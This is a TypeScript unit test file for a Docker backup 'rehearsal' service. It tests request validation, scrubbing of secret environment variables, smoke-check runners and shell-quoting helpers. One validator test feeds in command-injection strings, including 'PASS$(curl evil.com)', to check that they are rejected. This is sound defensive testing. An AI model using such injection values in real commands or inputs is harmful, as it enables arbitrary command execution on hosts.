import { RehearsalService } from '../services/RehearsalService'
import type { RehearsalRequest, SmokeCheck } from '@docker-rescue-kit/shared'
import { SCRUB_ENV_DEFAULT_PATTERNS, SMOKE_CHECK_TEMPLATES } from '@docker-rescue-kit/shared'
import { createSmokeCheckRegistry, __testables } from '../services/SmokeCheckRunners'

// ---------------------------------------------------------------------------
// Light fakes for the service deps. We're not mocking Docker behavior here —
// the integration test (gated by CI_INTEGRATION=1) covers the real spin-up.
// These unit tests cover argument validation, env-scrub logic, the smoke-check
// registry shape, and the SMOKE_CHECK_TEMPLATES constant integrity.
// ---------------------------------------------------------------------------

class FakeAudit {
  events: Array<{ action: string; details?: any }> = []
  async record(action: string, details?: any) {
    this.events.push({ action, details })
  }
}

class FakeDb {
  saved: any[] = []
  async saveRehearsalReport(r: any) { this.saved.push(r) }
  async getRehearsal(id: string) { return this.saved.find(r => r.id === id) || null }
  async listRehearsals(_opts?: any) { return this.saved.map(r => ({ id: r.id, status: r.status, ok: r.ok, startedAt: r.startedAt })) }
  async deleteRehearsal(id: string) { this.saved = this.saved.filter(r => r.id !== id) }
}

class FakePolicyManager {
  policies = new Map<string, any>()
  backups = new Map<string, any>()
  async getPolicy(id: string) { return this.policies.get(id) || null }
  async getBackup(id: string) { return this.backups.get(id) || null }
}

// DockerService stub — every method that RehearsalService might call returns
// quickly without actually touching Docker. We never enqueue an actual run in
// these tests; we exercise the public validation surface and the helpers.
class FakeDocker {
  async execInContainer(_c: string, _cmd: string[], _opts?: any) {
    return { exitCode: 0, stdout: '', stderr: '' }
  }
}

class FakeNotificationDispatcher {
  async dispatchNotification() {
    return true
  }
}

function newService() {
  const docker = new FakeDocker() as any
  const policyManager = new FakePolicyManager() as any
  const audit = new FakeAudit() as any
  const db = new FakeDb() as any
  const notificationDispatcher = new FakeNotificationDispatcher() as any
  const svc = new RehearsalService({
    docker,
    policyManager,
    audit,
    stagingDir: '/tmp/drk-test-staging',
    db,
    notificationDispatcher,
  })
  return { svc, docker, policyManager, audit, db, notificationDispatcher }
}

// ---------------------------------------------------------------------------

describe('RehearsalService.enqueue validation', () => {
  it('rejects when smokeChecks is missing or empty', async () => {
    const { svc } = newService()
    await expect(svc.enqueue({ smokeChecks: [] } as any)).rejects.toThrow(/smokeChecks/)
    await expect(svc.enqueue({} as any)).rejects.toThrow(/smokeChecks/)
  })

  it('rejects when neither policyId nor backupIds are provided', async () => {
    const { svc } = newService()
    const req: RehearsalRequest = { smokeChecks: [{ kind: 'tcp', container: 'app', port: 80 }] }
    await expect(svc.enqueue(req)).rejects.toThrow(/policyId or backupIds/)
  })

  it('rejects when policyId and backupIds are both provided', async () => {
    const { svc } = newService()
    const req: RehearsalRequest = {
      policyId: 'p1',
      backupIds: ['b1'],
      smokeChecks: [{ kind: 'tcp', container: 'app', port: 80 }],
    }
    await expect(svc.enqueue(req)).rejects.toThrow(/mutually exclusive/)
  })

  it('rejects a smoke check missing container', async () => {
    const { svc } = newService()
    const req = {
      policyId: 'p1',
      smokeChecks: [{ kind: 'tcp', port: 80 }],
    } as any
    await expect(svc.enqueue(req)).rejects.toThrow(/missing container/)
  })

  it('accepts a valid request and returns an id, persisting pending state', async () => {
    const { svc, db } = newService()
    const req: RehearsalRequest = {
      backupIds: ['no-such-backup'],
      smokeChecks: [{ kind: 'tcp', container: 'app', port: 80 }],
    }
    const id = await svc.enqueue(req)
    expect(typeof id).toBe('string')
    expect(id.length).toBeGreaterThan(0)
    expect(db.saved.length).toBeGreaterThanOrEqual(1)
    expect(db.saved[0].status).toBe('pending')
  })
})

// ---------------------------------------------------------------------------

describe('RehearsalService.scrubEnv', () => {
  const { svc } = newService()
  // private method access for unit testing — common pattern in this repo
  const scrub = (env: string[], allow?: string[]) => (svc as any).scrubEnv(env, allow)

  it('strips *_TOKEN, *_SECRET, *_KEY, *_PASSWORD', () => {
    const env = [
      'NODE_ENV=production',
      'JWT_TOKEN=abc',
      'API_SECRET=xyz',
      'ENCRYPTION_KEY=k',
      'POSTGRES_PASSWORD=p',
      'LOG_LEVEL=info',
    ]
    const result = scrub(env)
    expect(result).toContain('NODE_ENV=production')
    expect(result).toContain('LOG_LEVEL=info')
    expect(result).not.toContain('JWT_TOKEN=abc')
    expect(result).not.toContain('API_SECRET=xyz')
    expect(result).not.toContain('ENCRYPTION_KEY=k')
    expect(result).not.toContain('POSTGRES_PASSWORD=p')
  })

  it('strips DATABASE_URL by default but keeps it when allowEnvVars includes it', () => {
    const env = ['DATABASE_URL=postgres://user:pass@db/x']
    expect(scrub(env)).toEqual([])
    expect(scrub(env, ['DATABASE_URL'])).toEqual(['DATABASE_URL=postgres://user:pass@db/x'])
  })

  it('strips AWS_*, STRIPE_*, LICENSE_*, OAUTH_*', () => {
    const env = [
      'AWS_ACCESS_KEY_ID=A',
      'AWS_SECRET_ACCESS_KEY=B',
      'STRIPE_KEY=sk_live_x',
      'LICENSE_JWT=eyJ...',
      'OAUTH_CLIENT=abc',
      'KEEP_ME=ok',
    ]
    const result = scrub(env)
    expect(result).toEqual(['KEEP_ME=ok'])
  })

  it('allowEnvVars is case-insensitive', () => {
    const env = ['MY_API_KEY=secret']
    expect(scrub(env, ['my_api_key'])).toEqual(['MY_API_KEY=secret'])
  })

  it('passes through entries with no `=`', () => {
    // Docker sometimes returns env entries without values
    const env = ['NODE_ENV', 'JWT_TOKEN']
    const result = scrub(env)
    expect(result).toContain('NODE_ENV')
    expect(result).not.toContain('JWT_TOKEN')
  })

  it('shared SCRUB_ENV_DEFAULT_PATTERNS list is non-empty and case-insensitive', () => {
    expect(SCRUB_ENV_DEFAULT_PATTERNS.length).toBeGreaterThan(0)
    for (const re of SCRUB_ENV_DEFAULT_PATTERNS) {
      expect(re.flags).toContain('i')
    }
  })
})

// ---------------------------------------------------------------------------

describe('SmokeCheckRunners registry', () => {
  it('registers all 5 expected kinds', () => {
    const reg = createSmokeCheckRegistry()
    expect(reg.has('http')).toBe(true)
    expect(reg.has('exec')).toBe(true)
    expect(reg.has('tcp')).toBe(true)
    expect(reg.has('file_exists')).toBe(true)
    expect(reg.has('sql_select_1')).toBe(true)
    expect(reg.size).toBe(5)
  })

  it('every runner exposes the same kind it was registered under', () => {
    const reg = createSmokeCheckRegistry()
    for (const [kind, runner] of reg.entries()) {
      expect(runner.kind).toBe(kind)
    }
  })
})

// ---------------------------------------------------------------------------

describe('SmokeCheckRunners helpers', () => {
  const { shellArg, truncate, isPosixEnvVarName } = __testables

  it('shellArg leaves safe chars alone and quotes everything else', () => {
    expect(shellArg('postgres')).toBe('postgres')
    expect(shellArg('user_2')).toBe('user_2')
    expect(shellArg("o'brien")).toBe(`'o'\\''brien'`)
    expect(shellArg('a b c')).toBe(`'a b c'`)
  })

  it('truncate shortens long strings with an ellipsis', () => {
    expect(truncate('short', 10)).toBe('short')
    expect(truncate('a'.repeat(50), 10)).toBe('aaaaaaaaaa…')
  })

  it('isPosixEnvVarName accepts legal env-var names', () => {
    expect(isPosixEnvVarName('POSTGRES_PASSWORD')).toBe(true)
    expect(isPosixEnvVarName('MYSQL_PWD')).toBe(true)
    expect(isPosixEnvVarName('_X')).toBe(true)
    expect(isPosixEnvVarName('a1')).toBe(true)
  })

  it('isPosixEnvVarName rejects names that could break out of shell context', () => {
    // The whole point — these strings would inject extra commands if expanded raw
    expect(isPosixEnvVarName('PASS"; echo HACK; #')).toBe(false)
    expect(isPosixEnvVarName('PASS$(curl evil.com)')).toBe(false)
    expect(isPosixEnvVarName('PASS PASSWORD')).toBe(false)
    expect(isPosixEnvVarName('1STARTS_WITH_DIGIT')).toBe(false)
    expect(isPosixEnvVarName('')).toBe(false)
    expect(isPosixEnvVarName('PASS-WITH-DASH')).toBe(false)
  })
})

// ---------------------------------------------------------------------------

describe('SMOKE_CHECK_TEMPLATES', () => {
  it('ships templates for all 6 stack-recipe entries', () => {
    const expected = ['homeassistant', 'plex', 'immich', 'nextcloud', 'vaultwarden', 'n8n']
    for (const stack of expected) {
      expect(SMOKE_CHECK_TEMPLATES[stack]).toBeDefined()
      expect(SMOKE_CHECK_TEMPLATES[stack].length).toBeGreaterThan(0)
    }
  })

  it('every template entry is a valid SmokeCheck (has kind + container)', () => {
    for (const [stack, checks] of Object.entries(SMOKE_CHECK_TEMPLATES)) {
      for (const check of checks) {
        expect(typeof check.kind).toBe('string')
        expect(typeof check.container).toBe('string')
        expect(check.container.length).toBeGreaterThan(0)
        // sanity: kind matches the union
        expect(['http', 'exec', 'tcp', 'file_exists', 'sql_select_1']).toContain(check.kind)
        // per-kind requirements
        if (check.kind === 'http' || check.kind === 'tcp') {
          expect(typeof (check as any).port).toBe('number')
        }
        if (check.kind === 'sql_select_1') {
          expect(['postgres', 'mysql', 'mssql']).toContain((check as any).driver)
        }
        if (check.kind === 'file_exists') {
          expect(typeof (check as any).path).toBe('string')
        }
        if (check.kind === 'exec') {
          expect(Array.isArray((check as any).command)).toBe(true)
          expect((check as any).command.length).toBeGreaterThan(0)
        }
        void stack
      }
    }
  })
})
